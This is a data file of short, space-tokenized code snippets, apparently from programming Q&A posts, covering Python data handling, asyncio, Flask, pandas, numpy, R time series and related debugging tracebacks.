"r = xrange ( 1 , 10 ) print sum ( 1 for v in r if v % 2 == 0 ) # 4print sum ( 1 for v in r if v % 3 == 0 ) # 3 r = ( 7 * i for i in xrange ( 1 , 10 ) ) print sum ( 1 for v in r if v % 2 == 0 ) # 4print sum ( 1 for v in r if v % 3 == 0 ) # 0 r = enumerate ( mylist ) f = open ( myfilename , ' r ' )"
"Input - 6 6 4 , Output - 4 a = map ( int , raw_input ( ) .split ( ) ) l , b , s = a [ 0 ] , a [ 1 ] , a [ 2 ] print ( ( ( l+s-1 ) /s ) * ( ( b+s-1 ) /s ) )"
< case-file > < serial-number > 123456789 < /serial-number > < transaction-date > 20150101 < /transaction-date > < case-file-header > < filing-date > 20140101 < /filing-date > < /case-file-header > < case-file-statements > < case-file-statement > < code > AQ123 < /code > < text > Case file statement text < /text > < /case-file-statement > < case-file-statement > < code > BC345 < /code > < text > Case file statement text < /text > < /case-file-statement > < /case-file-statements > < classifications > < classification > < international-code-total-no > 1 < /international-code-total-no > < primary-code > 025 < /primary-code > < /classification > < /classifications > < /case-file >
"import timeimport datetime as dtimport numpy as npdef combineArs ( dict1 , dict2 ) : `` '' '' Combine data from 2 dictionaries into a list . dict1 contains primary data ( e.g . seeing parameter ) . The function compares each timestamp in dict1 to dict2 to see if there is a matching timestamp record ( s ) in dict2 ( plus/minus 5 minutes ) . ==If yes : a list called data gets appended with the corresponding parameter value from dict2 . ( Note that if there are more than 1 record matching , the first occuring value gets appended to the list ) . ==If no : a list called data gets appended with 0 . '' '' '' # Specify the keys to use pwfs2Key = 'pwfs2 : dc : seeing ' dimmKey = 'ws : seeFwhm ' # Create an iterator for primary dict datesPrimDictIter = iter ( dict1 [ pwfs2Key ] [ 'datetimes ' ] ) # Take the first timestamp value in primary dict nextDatePrimDict = next ( datesPrimDictIter ) # Split the second dictionary into lists datesSecondDict = dict2 [ dimmKey ] [ 'datetime ' ] valsSecondDict = dict2 [ dimmKey ] [ 'values ' ] # Define time window fiveMins = dt.timedelta ( minutes = 5 ) data = [ ] # st = time.time ( ) for i , nextDateSecondDict in enumerate ( datesSecondDict ) : try : while nextDatePrimDict < nextDateSecondDict - fiveMins : # If there is no match : append zero and move on data.append ( 0 ) nextDatePrimDict = next ( datesPrimDictIter ) while nextDatePrimDict < nextDateSecondDict + fiveMins : # If there is a match : append the value of second dict data.append ( valsSecondDict [ i ] ) nextDatePrimDict = next ( datesPrimDictIter ) except StopIteration : break data = np.array ( data ) # st = time.time ( ) - st return data"
"class Base ( object ) : def __init__ ( self , content ) : self.__content = content @ property def content ( self ) : return self.__content @ content.setter def content ( self , value ) : self.__content = valueclass Number ( Base ) : def __init__ ( self , content ) : super ( Number , self ) .__init__ ( content ) def __add__ ( self , other ) : return Number ( self.content + other.content ) ... and so onclass Float ( Number ) : def __init__ ( self , content ) : super ( Float , self ) .__init__ ( content ) class Integer ( Number ) : def __init__ ( self , content ) : super ( Integer , self ) .__init__ ( content ) if __name__ == '__main__ ' : f1 = Float ( 3.5 ) f2 = Float ( 2.3 ) f3 = f1 + f2 type ( f3 )"
struct SCIP { // ... } void SCIPcreate ( SCIP** s )
"bot.send_photo ( chat_id=update.message.chat_id , photo=open ( img_dir , 'rb ' ) , caption='test ' , parse_mode=ParseMode.MARKDOWN ) images = [ Image.open ( i ) for i in dir_list ] widths , heights = zip ( * ( i.size for i in images ) ) total_width = sum ( widths ) max_height = max ( heights ) new_im = Image.new ( 'RGBA ' , ( total_width , max_height ) ) x_offset = 0for im in images : new_im.paste ( im , ( x_offset , 0 ) ) x_offset += im.size [ 0 ] return new_im # returns a PIL.Image.Image"
"class YieldOne : def __iter__ ( self ) : try : yield 1 except : print '*Excepted Successfully* ' # raisefor i in YieldOne ( ) : raise Exception ( 'test exception ' ) *Excepted Successfully*Traceback ( most recent call last ) : File `` < stdin > '' , line 2 , in < module > Exception : test exception"
"d1 = pd.DataFrame ( np.ones ( ( 3 , 3 ) , dtype=int ) , columns= [ ' A ' , ' B ' , ' C ' ] ) d2 = pd.DataFrame ( dict ( A= [ 1 , 1 , 1 ] , B= [ 1. , 1. , 1 . ] , C= [ 1 , 1 , 1 ] ) ) d1 A B C0 0 1 11 1 0 12 1 1 0 d2 A B C0 1 1.0 11 1 1.0 12 1 1.0 1 i , j = np.diag_indices ( 3 ) d1.values [ i , j ] = 0d1 A B C0 0 1 11 1 0 12 1 1 0 d2.values [ i , j ] = 0d2 A B C0 1 1.0 11 1 1.0 12 1 1.0 1"
"import numpy as npimport pandas as pddf = spark.createDataFrame ( pd.DataFrame ( { ' x ' : np.random.rand ( 100 ) , ' y ' : np.random.rand ( 100 ) } ) ) df.write.json ( 's3 : //path/to/json ' ) { `` x '' :0.9953802385540144 , '' y '' :0.476027611419198 } { `` x '' :0.929599290575914 , '' y '' :0.72878523939521 } { `` x '' :0.951701684432855 , '' y '' :0.8008064729546504 } [ { `` x '' :0.9953802385540144 , '' y '' :0.476027611419198 } , { `` x '' :0.929599290575914 , '' y '' :0.72878523939521 } , { `` x '' :0.951701684432855 , '' y '' :0.8008064729546504 } ]"
"from Tkinter import *root = Tk ( ) widget = Button ( root , text='text ' ) widget.pack ( expand=YES , fill=BOTH ) root.mainloop ( )"
# main.py file @ click.group ( ) def my_app ( ) : passif __name__ == `` __main__ '' : my_app ( ) from main import my_app # command_x.py @ my_app.command ( ) def command_x ( ) : pass app = Flask ( `` my_app '' ) @ my_app.route ( `` / '' ) def view_x ( ) : passif __name__ == `` __main__ '' : app.run ( ) # blueprints.pyblueprint = Blueprint ( yaddayadda ) @ blueprint.route ( `` / '' ) def view_x ( ) : pass # app_factory.pyfrom blueprints import view_xdef create_app ( ) : app = Flask ( ) view_x.init_app ( app ) return app # main.pyfrom app_factory import create_appif __name__ == `` __main__ '' : app = create_app ( ) app.run ( )
"import asyncioimport aiohttpfrom contextlib import suppressclass Spider ( object ) : def __init__ ( self ) : self.max_tasks = 2 self.task_queue = asyncio.Queue ( self.max_tasks ) self.loop = asyncio.get_event_loop ( ) self.counter = 1 def close ( self ) : for w in self.workers : w.cancel ( ) async def fetch ( self , url ) : try : async with aiohttp.ClientSession ( loop = self.loop ) as self.session : with aiohttp.Timeout ( 30 , loop = self.session.loop ) : async with self.session.get ( url ) as resp : print ( 'get response from url : % s ' % url ) except : pass finally : pass async def work ( self ) : while True : url = await self.task_queue.get ( ) await self.fetch ( url ) self.task_queue.task_done ( ) def assign_work ( self ) : print ( ' [ * ] assigning work ... ' ) url = 'https : //www.python.org/ ' if self.counter > 10 : return 'done ' for _ in range ( self.max_tasks ) : self.counter += 1 self.task_queue.put_nowait ( url ) async def crawl ( self ) : self.workers = [ self.loop.create_task ( self.work ( ) ) for _ in range ( self.max_tasks ) ] while True : if self.assign_work ( ) == 'done ' : break await self.task_queue.join ( ) self.close ( ) def main ( ) : loop = asyncio.get_event_loop ( ) spider = Spider ( ) try : loop.run_until_complete ( spider.crawl ( ) ) except KeyboardInterrupt : print ( 'Interrupt from keyboard ' ) spider.close ( ) pending = asyncio.Task.all_tasks ( ) for w in pending : w.cancel ( ) with suppress ( asyncio.CancelledError ) : loop.run_until_complete ( w ) finally : loop.stop ( ) loop.run_forever ( ) loop.close ( ) if __name__ == '__main__ ' : main ( )"
"> rd < - read.table ( 'Data/TS.csv ' , sep = ' , ' , header = TRUE ) > inp < - ts ( rd $ Sales , frequency = 12 , start = c ( 1965 , 1 ) ) > inp Jan Feb Mar Apr May Jun Jul Aug Sep Oct Nov Dec1965 154 96 73 49 36 59 95 169 210 278 298 2451966 200 118 90 79 78 91 167 169 289 347 375 2031967 223 104 107 85 75 99 135 211 335 460 488 3261968 346 261 224 141 148 145 223 272 445 560 612 4671969 518 404 300 210 196 186 247 343 464 680 711 6101970 613 392 273 322 189 257 324 404 677 858 895 6641971 628 308 324 248 272 > library ( tseries ) > adf.test ( inp ) Augmented Dickey-Fuller Testdata : inpDickey-Fuller = -7.2564 , Lag order = 4 , p-value = 0.01alternative hypothesis : stationary import pandas as pdfrom statsmodels.tsa.stattools import adfullerdf = pd.read_csv ( 'Data/TS.csv ' ) ts = pd.Series ( list ( df [ 'Sales ' ] ) , index=pd.to_datetime ( df [ 'Month ' ] , format= ' % Y- % m ' ) ) s_test = adfuller ( ts , autolag='AIC ' ) print ( `` p value > 0.05 means data is non-stationary : `` , s_test [ 1 ] ) # output : p value > 0.05 means data is non-stationary : 0.988889420517"
"# Example : # N = 2 : # output : 99 ( 0-99 without 13 number ) # N =1 : # output : 10 ( 0-9 without 13 number ) N = int ( raw_input ( ) ) if N < 2 : print 10else : without_13 = 10 for i in range ( 10 , int ( ' 9 ' * N ) +1 ) : string = str ( i ) if string.count ( `` 13 '' ) > = 1 : continue without_13 += 1 print without_13"
mylist = [ func ( i ) for i in range ( N ) ] mylist = [ None ] *Nfor i in range ( N ) : mylist [ i ] = func ( i )
"import numpy as npfrom numpy import exp , sqrt , pi , linspacefrom matplotlib import cmimport matplotlib.pyplot as pltimport scipy as spimport pylab # fouriertdata = np.arange ( 5999 . ) /300datay = 3*np.sin ( tdata ) +6*np.sin ( 2*tdata ) fouriery = np.fft.fft ( datay ) freqs = np.fft.fftfreq ( datay.size , d=0.1 ) pylab.plot ( freqs , fouriery ) pylab.show ( )"
"library ( boot ) result < - boot ( data , bootfun,10000 ) boot.ci ( result )"
"class _Point2D : def __init__ ( self , x , y ) : self.x = x self.y = y def __repr__ ( self ) : return 'point : ( ' + str ( self.x ) + ' , ' + str ( self.y ) + ' ) ' initialPointsList = [ ] initialPointsList.append ( _Point2D ( 1 , 1 ) ) initialPointsList.append ( _Point2D ( 1 , 2 ) ) initialPointsList.append ( _Point2D ( 1 , 3 ) ) initialPointsList.append ( _Point2D ( 1 , 4 ) ) initialPointsList.append ( _Point2D ( 1 , 5 ) ) initialPointsList.append ( _Point2D ( 1 , 6 ) ) initialPointsList.append ( _Point2D ( 1 , 7 ) ) burnedPointsList = [ ] burnedPointsList.append ( _Point2D ( 1 , 2 ) ) burnedPointsList.append ( _Point2D ( 1 , 3 ) ) result = set ( initialPointsList ) - set ( burnedPointsList ) for item in result : print item point : ( 1 , 1 ) point : ( 1 , 4 ) point : ( 1 , 5 ) point : ( 1 , 6 ) point : ( 1 , 2 ) point : ( 1 , 3 ) point : ( 1 , 7 ) point : ( 1 , 1 ) point : ( 1 , 4 ) point : ( 1 , 5 ) point : ( 1 , 6 ) point : ( 1 , 7 )"
'foo ' in dct and 'bar ' in dct and 'baz ' in dct
obj = SomeClass ( ) t = type ( obj )
def find ( xs ) : neg_int = [ ] pos_int = [ ] if len ( xs ) == 1 : return str ( xs [ 0 ] ) for i in xs : if i < 0 : neg_int.append ( i ) elif i > 0 : pos_int.append ( i ) if len ( neg_int ) == 1 and len ( pos_int ) == 0 and 0 in xs : return str ( 0 ) if len ( neg_int ) == len ( pos_int ) == 0 : return str ( 0 ) max = 1 if len ( pos_int ) > 0 : for x in pos_int : max=x*max if len ( neg_int ) % 2 == 1 : max_neg = neg_int [ 0 ] for j in neg_int : if j > max_neg : max_neg = j neg_int.remove ( max_neg ) for k in neg_int : max = k*max return str ( max )
"from mymodule import readCSVtsimport pandas as pddata = readCSVts ( 'file.csv ' ) TypeError Traceback ( most recent call last ) < ipython-input-158-8f82f1a78260 > in < module > ( ) -- -- > 1 data = readCSVts ( 'file.csv ' ) /home/me/path/to/mymodule.py in readCSVts ( filename ) 194 Cons_NaNs=hydroTS [ ( hydroTS.level.isnull ( ) ) & ( hydroTS.level.shift ( ) .isnull ( ) ) & ( hydroTS.level.shift ( periods=2 ) .isnull ( ) ) ] 195 # This is a pandas dataframe containing all rows with NaN 196 Cons_NaNs_count = len ( Cons_NaNs ) 197 Cons_NaNs_str = str ( Cons_NaNs_count ) 198 Cons_NaN_Name_joiner = [ current_csv , ' ; ' , Cons_NaNs ] -- > 199 Cons_NaN_Name_str = `` .join ( Cons_NaN_Name_joiner ) TypeError : sequence item 2 : expected string , DataFrame found 197 Cons_NaNs_str = str ( Cons_NaNs_count ) 198 Cons_NaN_Name_joiner = [ current_csv , ' ; ' , Cons_NaNs_str ] -- > 199 Cons_NaN_Name_str = `` .join ( Cons_NaN_Name_joiner ) TypeError : sequence item 2 : expected string , DataFrame found"
"> > > nums [ 2 , 1 , 0 ] > > > a = [ 2,1,0 ] > > > a [ 0 ] , a [ a [ 0 ] ] = a [ a [ 0 ] ] , a [ 0 ] > > > a [ 2 , 1 , 0 ] > > > a [ 0 ] 2 > > > a [ 0 ] , a [ 2 ] = a [ 2 ] , a [ 0 ] > > > a [ 0 , 1 , 2 ] tmp = a [ 0 ] ( tmp = 2 ) a [ 0 ] = a [ a [ 0 ] ] ( a [ 0 ] = a [ 2 ] = 0 ) a [ a [ 0 ] ] = tmp ( a [ a [ 0 ] ] = a [ 0 ] = tmp = 2 ) The behavior of these function templates is equivalent to : template < class T > void swap ( T & a , T & b ) { T c ( std : :move ( a ) ) ; a=std : :move ( b ) ; b=std : :move ( c ) ; } template < class T , size_t N > void swap ( T ( & a ) [ N ] , T ( & b ) [ N ] ) { for ( size_t i = 0 ; i < N ; ++i ) swap ( a [ i ] , b [ i ] ) ; }"
"class Constant : def __init__ ( self , value ) : self.value = value def __get__ ( self , *args ) : return self.value def __repr__ ( self ) : return ' % s ( % r ) ' % ( self.__class__.__name__ , self.value ) G = Constant ( 6.67300E-11 ) Out [ 49 ] : Constant ( 3 ) return self.G * self.mass / ( self.radius * self.radius )"
"import numpy as npimport sympy as spfrom sympy.abc import x , y , zxg , yg , zg = np.mgrid [ 0:1:50*1j , 0:1:50*1j , 0:1:50*1j ] f = sp.sin ( x ) *sp.cos ( y ) *sp.sin ( z ) lambda_f = sp.lambdify ( [ x , y , z ] , f , `` numpy '' ) fn = lambda_f ( xg , yg , zg ) print fn"
"myPackage -- __init__.py < -- empty -- signal.py -- plot.py from plot import plot_signaldef build_filter ( ) : ... def other_function ( ) : plot_signal ( ) from signal import build_filterdef plot_signal ( ) : ... def other_function ( ) : build_filter ( ) import myPackage as mpmp.plot.plot_signal ( ) from myPackage import plot , signalplot.plot_signal ( )"
"from pyspark import SparkContextif __name__ == '__main__ ' : sc = SparkContext ( 'local [ 6 ] ' , 'pySpark_pyCharm ' ) rdd = sc.parallelize ( [ 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 ] ) rdd.collect ( ) rdd.count ( )"
"import cv2from skimage.feature import peak_local_maxfrom skimage.morphology import watershedfrom scipy import ndimageimport numpy as npimport imutilsimage = cv2.imread ( `` cellorigin.jpg '' ) gray = cv2.cvtColor ( image , cv2.COLOR_BGR2GRAY ) thresh = cv2.threshold ( gray , 0 , 255 , cv2.THRESH_BINARY_INV | cv2.THRESH_OTSU ) [ 1 ] cv2.imshow ( `` Thresh '' , thresh ) D = ndimage.distance_transform_edt ( thresh ) localMax = peak_local_max ( D , indices=False , min_distance=20 , labels=thresh ) cv2.imshow ( `` D image '' , D ) markers = ndimage.label ( localMax , structure=np.ones ( ( 3 , 3 ) ) ) [ 0 ] labels = watershed ( -D , markers , mask=thresh ) print ( `` [ INFO ] { } unique segments found '' .format ( len ( np.unique ( labels ) ) - 1 ) ) for label in np.unique ( labels ) : # if the label is zero , we are examining the 'background ' # so simply ignore it if label == 0 : continue # otherwise , allocate memory for the label region and draw # it on the mask mask = np.zeros ( gray.shape , dtype= '' uint8 '' ) mask [ labels == label ] = 255 # detect contours in the mask and grab the largest one cnts = cv2.findContours ( mask.copy ( ) , cv2.RETR_EXTERNAL , cv2.CHAIN_APPROX_SIMPLE ) cnts = imutils.grab_contours ( cnts ) c = max ( cnts , key=cv2.contourArea ) # draw a circle enclosing the object ( ( x , y ) , r ) = cv2.minEnclosingCircle ( c ) cv2.circle ( image , ( int ( x ) , int ( y ) ) , int ( r ) , ( 0 , 255 , 0 ) , 2 ) cv2.putText ( image , `` # { } '' .format ( label ) , ( int ( x ) - 10 , int ( y ) ) , cv2.FONT_HERSHEY_SIMPLEX , 0.6 , ( 0 , 0 , 255 ) , 2 ) cv2.imshow ( `` input '' , imagecv2.waitKey ( 0 )"
"2 < = N < = 10^52 < = K < = N N = input ( ) K = input ( ) assert 2 < = N < = 10**5assert 2 < = K < = Na = [ ] for i in xrange ( 0 , N ) : a.append ( input ( ) ) a.sort ( ) minimum = sys.maxintstartindex = 0for i in xrange ( 0 , N-K+1 ) : last = i + K tmp = 0 for j in xrange ( i , last ) : for l in xrange ( j+1 , last ) : tmp += abs ( a [ j ] -a [ l ] ) if ( tmp > minimum ) : break if ( tmp < minimum ) : minimum = tmp startindex = i # end index = startindex + K ? N = 7K = 3array = [ 10,100,300,200,1000,20,30 ] result = [ 10,20,30 ] N = 10K = 4array = [ 1,2,3,4,10,20,30,40,100,200 ] result = [ 1,2,3,4 ]"
"dialogflow.types.EventInput import dialogflow_v2 as dialogflowsession_client = dialogflow.SessionsClient ( ) session = session_client.session_path ( project_id , session_id ) parameters = struct_pb2.Struct ( ) parameters [ 'given-name ' ] = 'Jeff'parameters [ 'last-name ' ] = 'Bridges'event_input = dialogflow.types.EventInput ( name='greetPerson ' , language_code='de ' , parameters=parameters ) query_input = dialogflow.types.QueryInput ( event=event_input ) response = session_client.detect_intent ( session=session , query_input=query_input ) parameters = { 'given-name ' : 'Jeff ' , 'last-name ' : 'Bridges ' } from google.protobuf.struct_pb2 import Struct , Valueparameters = Struct ( fields= { 'given-name ' : Value ( string_value='Jeff ' ) , 'last-name ' : Value ( string_value='Bidges ' ) } )"
"def get_combined_generator ( images_dir , csv_dir , split , *args ) : `` '' '' Creates train/val generators on images and csv data . Arguments : images_dir : string Path to a directory with subdirectories for each class . csv_dir : string Path to a directory containing train/val csv files with extra attributes . split : string Current split being used ( train , val or test ) `` '' '' img_width , img_height , batch_size = args datagen = ImageDataGenerator ( rescale=1 . / 255 ) generator = datagen.flow_from_directory ( f ' { images_dir } / { split } ' , target_size= ( img_width , img_height ) , batch_size=batch_size , shuffle=True , class_mode='categorical ' ) df = pd.read_csv ( f ' { csv_dir } / { split } .csv ' , index_col='image ' ) def my_generator ( image_gen , data ) : while True : i = image_gen.batch_index batch = image_gen.batch_size row = data [ i * batch : ( i + 1 ) * batch ] images , labels = image_gen.next ( ) yield [ images , row ] , labels csv_generator = my_generator ( generator , df ) return csv_generator"
"import pyqtgraph as pgimport numpy as npx = np.arange ( 1000 ) y = np.random.normal ( size= ( 3 , 1000 ) ) plotWidget = pg.plot ( title= '' Three plot curves '' ) for i in range ( 3 ) : plotWidget.plot ( x , y [ i ] , pen= ( i,3 ) )"
"[ ] = [ ] [ a , b ] = [ 1 , 2 ] > > > [ ] = [ 1 ] Traceback ( most recent call last ) : File `` < stdin > '' , line 1 , in < module > ValueError : too many values to unpack > > > ( ) = ( ) File `` < stdin > '' , line 1SyntaxError : ca n't assign to ( )"
"for item in myList : for i , item in enumerate ( myList ) : for i , item in enumerate : for i , item in enumerate ( myList ) :"
import unittestclass TestFoo ( unittest.TestCase ) : def test_foo ( self ) : print `` in test_foo '' from test_foo import TestFooclass TestBar ( TestFoo ) : def test_bar ( self ) : print `` in test_bar '' [ 999 ] anarcat @ marcos : t $ pytest -vno test dir found testing here : /tmp/t=========================== test_bar.py ============================test_bar ( test_bar.TestBar ) ... in test_baroktest_foo ( test_bar.TestBar ) ... in test_foooktest_foo ( test_foo.TestFoo ) ... in test_foook=========================== test_foo.py ============================test_foo ( test_foo.TestFoo ) ... in test_foook*******************************************************************************Ran 4 test cases in 0.00s ( 0.00s CPU ) All 2 modules OK import unittestclass TestFoo ( unittest.TestCase ) : def test_foo ( self ) : print `` in test_foo '' class TestBar ( TestFoo ) : def test_bar ( self ) : print `` in test_bar '' [ 1001 ] anarcat @ marcos : t $ pytest -vno test dir found testing here : /tmp/t=========================== test_foo.py ============================test_bar ( test_foo.TestBar ) ... in test_baroktest_foo ( test_foo.TestBar ) ... in test_foooktest_foo ( test_foo.TestFoo ) ... in test_foook*******************************************************************************Ran 3 test cases in 0.00s ( 0.00s CPU ) All 1 modules OK
"# Initial Theano Code ( this works ) import theano.tensor as tsrx = tsr.dscalar ( ' x ' ) y = tsr.dscalar ( ' y ' ) z = x + y # Snippet 1import pymc3 as pmimport theano.tensor as tsrx = tsr.dscalar ( ' x ' ) y = tsr.dscalar ( ' y ' ) z = x + y # Snippet 2import theano.tensor as tsrimport pymc3 as pmx = tsr.dscalar ( ' x ' ) y = tsr.dscalar ( ' y ' ) z = x + y # Snippet 3import pymc3 as pmx = pm.theano.tensor.dscalar ( ' x ' ) y = pm.theano.tensor.dscalar ( ' y ' ) z = x + y -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -AttributeError Traceback ( most recent call last ) /Users/tom/anaconda/lib/python3.4/site-packages/theano/gof/op.py in __call__ ( self , *inputs , **kwargs ) 516 try : -- > 517 storage_map [ ins ] = [ self._get_test_value ( ins ) ] 518 compute_map [ ins ] = [ True ] /Users/tom/anaconda/lib/python3.4/site-packages/theano/gof/op.py in _get_test_value ( cls , v ) 478 -- > 479 raise AttributeError ( ' % s has no test value ' % v ) 480 AttributeError : x has no test valueDuring handling of the above exception , another exception occurred : ValueError Traceback ( most recent call last ) < ipython-input-2-ef8582b040f8 > in < module > ( ) 3 x = pm.theano.tensor.dscalar ( ' x ' ) 4 y = pm.theano.tensor.dscalar ( ' y ' ) -- -- > 5 z = x + y/Users/tom/anaconda/lib/python3.4/site-packages/theano/tensor/var.py in __add__ ( self , other ) 126 def __add__ ( self , other ) : 127 try : -- > 128 return theano.tensor.basic.add ( self , other ) 129 # We should catch the minimum number of exception here . 130 # Otherwise this will convert error when Theano flags/Users/tom/anaconda/lib/python3.4/site-packages/theano/gof/op.py in __call__ ( self , *inputs , **kwargs ) 523 run_perform = False 524 elif config.compute_test_value == 'raise ' : -- > 525 raise ValueError ( ' Can not compute test value : input % i ( % s ) of Op % s missing default value ' % ( i , ins , node ) ) 526 elif config.compute_test_value == 'ignore ' : 527 # silently skip testValueError : Can not compute test value : input 0 ( x ) of Op Elemwise { add , no_inplace } ( x , y ) missing default value"
=== > pip install -e git+https : //github.com/guettli/subx.git # egg=subxObtaining subx from git+https : //github.com/guettli/subx.git # egg=subx Cloning https : //github.com/guettli/subx.git to ./src/subxCollecting subprocess32 ( from subx ) Using cached subprocess32-3.2.7.tar.gz Complete output from command python setup.py egg_info : This backport is for Python 2.x only . -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- Command `` python setup.py egg_info '' failed with error code 1 in /tmp/pip-build-lju3nl1y/subprocess32/
"def getmonth ( day , week , year ) : # by day , week and year calculate the month print ( month ) getmonth ( 28 , 52 , 2014 ) # print 12getmonth ( 13 , 42 , 2014 ) # print 10getmonth ( 6 , 2 , 2015 ) # print 1"
"import gtk , gimpuifrom gimpfu import *def debugMessage ( Message ) : dialog = gtk.MessageDialog ( None , 0 , gtk.MESSAGE_INFO , gtk.BUTTONS_OK , Message ) dialog.run ( ) dialog.hide ( ) def python_fu_mahdicoordinates ( image , layer ) : vectors = pdb.gimp_image_get_active_vectors ( image ) nstrokes , strokes = pdb.gimp_vectors_get_strokes ( vectors ) stroke_type , n_points , cpoints , closed = pdb.gimp_vectors_stroke_get_points ( vectors , strokes [ 0 ] ) x0 = cpoints [ 0 ] y0 = cpoints [ 1 ] x1 = cpoints [ 6 ] y1 = cpoints [ 7 ] x2 = cpoints [ 12 ] y2 = cpoints [ 13 ] x3 = cpoints [ 18 ] y3 = cpoints [ 19 ] debugMessage ( ' ( ' + str ( x0 ) + ' , ' + str ( y0 ) + ' , '+str ( x1 ) + ' , '+str ( y1 ) + ' , '+str ( x2 ) + ' , '+str ( y2 ) + ' , '+str ( x3 ) + ' , '+str ( y3 ) + ' ) ' ) returnregister ( `` python_fu_mahdicoordinates '' , `` Mahdi Cooridnates '' , `` Get Cooridnates of any path '' , `` Mahdi Alkhatib '' , `` Mahdi Alkhatib '' , `` 2016 '' , `` Mahdi Cooridnates ... '' , `` * '' , [ ] , [ ] , python_fu_mahdicoordinates , menu= `` < Image > /Tools/Misc '' ) main ( )"
"# load datasetdataframe = pandas.read_csv ( `` USDJPY,5.csv '' , header=None ) dataset = dataframe.valuesX = dataset [ : ,0:59 ] Y = dataset [ : ,59 ] # fit Dense Keras modelmodel.fit ( X , Y , validation_data= ( x , y_test ) , epochs=150 , batch_size=10 )"
"Point = namedtuple ( ' P ' , [ ' x ' , ' y ' ] )"
"path = '/Users/myname/folder/ 'm = [ os.path.join ( dirpath , f ) for dirpath , dirnames , files in os.walk ( path ) for f in fnmatch.filter ( files , '*.fits ' ) ] dataframes = [ ] for ii in range ( 0 , len ( m ) ) : data = pd.read_csv ( m [ ii ] , header = 'infer ' , delimiter = '\t ' ) d = pd.DataFrame ( data ) top = d [ 'desired_column ' ] .head ( ) bottom = d [ 'desired_column ' ] .tail ( ) First_and_Last = pd.concat ( [ top , bottom ] ) 0 2.456849e+061 2.456849e+062 2.456849e+063 2.456849e+064 2.456849e+061118 2.456852e+061119 2.456852e+061120 2.456852e+061121 2.456852e+061122 2.456852e+06"
"# ! /usr/bin/python3import asyncioimport pexpectclass Source : def __init__ ( self ) : self.flag = asyncio.Event ( ) self.sum = 0 def start ( self ) : self.flag.set ( ) def stop ( self ) : self.flag.clear ( ) @ asyncio.coroutine def run ( self ) : yield from self.flag.wait ( ) p = pexpect.spawn ( `` python -c `` `` 'import random , time\n '' `` while True : print ( random.choice ( ( -1 , 1 ) ) ) ; time.sleep ( 0.5 ) ' '' ) while self.flag.is_set ( ) : yield from p.expect_exact ( '\n ' , async=True ) self.sum += int ( p.before ) p.terminate ( ) @ asyncio.coroutinedef reporter ( source ) : while True : # Something like : new_sum = yield from source # ? ? ? print ( `` New sum is : { : d } '' .format ( new_sum ) ) # Potentially some other blocking operation yield from limited_throughput.write ( new_sum ) def main ( ) : loop = asyncio.get_event_loop ( ) source = Source ( ) loop.call_later ( 1 , source.start ) loop.call_later ( 11 , source.stop ) # Again , not sure what goes here ... asyncio.async ( reporter ( source ) ) loop.run_until_complete ( source.run ( ) ) loop.close ( ) if __name__ == '__main__ ' : main ( ) @ asyncio.coroutinedef run ( self ) : yield from self.flag.wait ( ) while self.flag.is_set ( ) : value = yield from asyncio.sleep ( 0.5 , random.choice ( ( -1 , 1 ) ) ) self.sum += value"
"def visualize_geo_store_canada ( stores_info_df , fig_name='store_strategy_Canada_map ' , title = 'Stores Strategy ' ) : data = [ dict ( type = 'scattergeo ' , # # # # # WHAT TO REPLACE ? # # # # # # # # # locationmode = 'USA-states ' , # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # lon = stores_info_df [ 'LONGITUDE ' ] , lat = stores_info_df [ 'LATITUDE ' ] , text = stores_info_df [ 'STRATEGY ' ] , mode = 'markers ' , marker = dict ( colorscale= 'Jet ' , color = stores_info_df [ 'STRATEGY ' ] , colorbar = dict ( title = 'Strategy ' , titleside = 'top ' , tickmode = 'array ' , ) ) ) ] layout = dict ( title = title , geo = dict ( # # # # # WHAT TO REPLACE ? # # # # # # # # # scope='usa ' , # projection=dict ( type='albers usa ' ) , # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # showland = True , landcolor = `` rgb ( 250 , 250 , 250 ) '' , subunitcolor = `` rgb ( 217 , 217 , 217 ) '' , countrycolor = `` rgb ( 217 , 217 , 217 ) '' , countrywidth = 0.5 , subunitwidth = 0.5 ) , ) fig = dict ( data=data , layout=layout ) plotly.offline.iplot ( fig , validate=False )"
# module Imagedef open ( file ) : ... class Image : def method1 : ... def method2 : ... # module myOriginalfrom Image import Imageclass ExtendedImage ( Image ) : def method3 : ... # module testimport myOriginalim = myOriginal.open ( `` picture.jpg '' )
temp = set ( ) # O ( 1 ) for i in first_100_million_set : # O ( N ) temp.add ( i ) # O ( 1 ) temp = set ( ) # O ( 1 ) for i in first_100_million_set : # O ( N ) if i in second_100_million_set : # O ( 1 ) temp.add ( i ) # O ( 1 )
"class Event ( models.Model ) : data = JSONField ( default=None ) { `` value_1 '' :20 , `` value_2 '' :25 } events = Event.objects.filter ( data__value_2__gte=F ( 'data__value_1 ' ) ) Can not resolve keyword 'value_1 ' into field . Join on 'data ' not permitted . events = Event.objects.filter ( data__value_2__gte=F ( 'data ' ) [ 'value_1 ' ] ) TypeError : ' F ' object has no attribute '__getitem__ '"
"A = np.array ( [ [ 1 , 2 , 3 ] , [ 100 , 200 , 300 ] ] ) B = np.array ( [ [ 10 , 20 , 30 ] , [ 1000 , 2000 , 3000 ] , [ -10 , -20 , -2 ] ] ) array ( [ [ -9 , -18 , -27 ] , [ -999 , -1998 , -2997 ] , [ 11 , 22 , 5 ] , [ 90 , 180 , 270 ] , [ -900 , -1800 , -2700 ] , [ 110 , 220 , 302 ] ] ) Shape : 6 X 3"
"class H ( ) : def m ( self ) : print ( `` H '' ) class G ( H ) : def m ( self ) : print ( `` G '' ) super ( ) .m ( ) class I ( G ) : def m ( self ) : print ( `` I '' ) super ( ) .m ( ) class F ( H ) : def m ( self ) : print ( `` F '' ) super ( ) .m ( ) class E ( H ) : def m ( self ) : print ( `` E '' ) super ( ) .m ( ) class D ( F ) : def m ( self ) : print ( `` D '' ) super ( ) .m ( ) class C ( E , F , G ) : def m ( self ) : print ( `` C '' ) super ( ) .m ( ) class B ( ) : def m ( self ) : print ( `` B '' ) super ( ) .m ( ) class A ( B , C , D ) : def m ( self ) : print ( `` A '' ) super ( ) .m ( ) x = A ( ) x.m ( ) ABCEDFGH"
"# ! /usr/bin/env pythonimport subprocessimport timesubprocess.call ( [ `` pwd '' ] , shell=True ) time.sleep ( 7 ) # to get a chance to read the output /home/myusername/PythonProjects /home/myusername"
